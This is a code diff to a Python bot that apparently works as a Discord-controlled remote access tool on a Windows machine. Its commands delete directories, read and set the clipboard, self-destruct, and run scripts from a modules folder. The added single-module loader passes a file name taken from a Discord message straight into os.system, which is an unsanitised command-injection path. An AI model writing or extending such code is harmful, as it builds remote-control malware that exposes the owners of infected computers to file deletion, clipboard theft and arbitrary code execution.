@@ -22,6 +22,11 @@ def load_modules():
             print(f"py {modules_path}\{module}")
             os.system(f"py {modules_path}\{module}")
 
+def load_module(module):
+    if module.endswith(".py"):
+        print(f"py {modules_path}\{module}")
+        os.system(f"py {modules_path}\{module}")
+
 def list_modules():
     modules = ""
     for module in os.listdir(modules_path):
@@ -75,7 +80,7 @@ async def on_message(message):
             .selfdestruct - Run a .bat file that removes the bot and all it's features from the computer.
             .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder
             .createdir - Create a directory. Usage: .createdir <new dir path>. Example .createdir c:/Users/user/Desktop/MyNewFolder
-            .modules - List/run modules in the /modules folder. Usage: .modules <list/load>
+            .modules - List/run module(s) in the /modules folder. Usage: .modules <list/load> <if load, specify either file_name.py or "all">
             .clipboard - Get/set the current clipboard item. Usage: .clipboard <get/set> <if you used ".clipboard set" parse the text to put into clipboard here> Note: .clipboard get returns the CURRENT copied text, not the whole history.
         """
         embed = discord.Embed(title="Command list", description=commandlist)
@@ -339,25 +344,30 @@ async def on_message(message):
         try:
             arg = message.content.split(" ")[1]
         except:
-            embed = discord.Embed(title="Modules", description="No argument given.", color=0x00ff00)
+            embed = discord.Embed(title="Module Loader", description="No argument given.", color=0x00ff00)
             await message.channel.send(embed=embed)
             return
         await message.delete()
         
         if arg == "list":
-            embed = discord.Embed(title="Modules", description=list_modules(), color=0x00ff00)
+            embed = discord.Embed(title="Module Loader", description=list_modules(), color=0x00ff00)
             await message.channel.send(embed=embed)
 
         elif arg == "load":
             try:
-                load_modules()
+                module = message.content.split(" ")[2]
+                if module != "" and module.endswith(".py"):
+                    load_module(module)
+                    embed = discord.Embed(title="Module Loader", description=f"Module {module} loaded.", color=0x00ff00)
+                elif module == "all":
+                    load_modules()
+                    embed = discord.Embed(title="Module Loader", description="All modules loaded.", color=0x00ff00)
             except Exception as e:
                 print(e)
                 embed = discord.Embed(title="Modules", description="Failed to load modules.", color=0x00ff00)
                 await message.channel.send(embed=embed)
                 return
 
-            embed = discord.Embed(title="Modules", description="Modules loaded.", color=0x00ff00)
             await message.channel.send(embed=embed)
         else:
             embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
